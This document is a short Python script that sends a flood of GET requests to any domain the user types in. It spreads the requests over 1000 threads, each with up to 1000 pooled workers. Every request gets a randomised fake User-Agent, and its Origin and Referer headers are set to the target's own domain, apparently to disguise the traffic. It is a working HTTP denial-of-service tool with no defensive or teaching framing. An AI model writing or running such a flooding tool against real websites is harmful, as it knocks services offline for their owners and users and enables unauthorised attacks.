import urllib3
import random
from concurrent.futures import ThreadPoolExecutor
from faker import Faker
import threading

fake = Faker()
http = urllib3.PoolManager()

def send_request(url, origin, referer):
    headers = {
        'User-Agent': fake.user_agent(),
        'Origin': origin,
        'Referer': referer
    }
    try:
        response = http.request('GET', url, headers=headers)
        print(f"Request sent to {url}, Status code: {response.status}")
    except urllib3.exceptions.RequestError as e:
        print(f"Error sending request: {e}")

def worker_thread(domain, origin, referer, num_requests):
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for _ in range(num_requests):
            executor.submit(send_request, domain, origin, referer)

def main():
    domain = input("Enter the domain (e.g., https://example.com): ")
    num_requests = int(input("How many requests would you like to send? "))
    num_threads = 1000
    origin = domain
    referer = domain
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker_thread, args=(domain, origin, referer, num_requests // num_threads))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
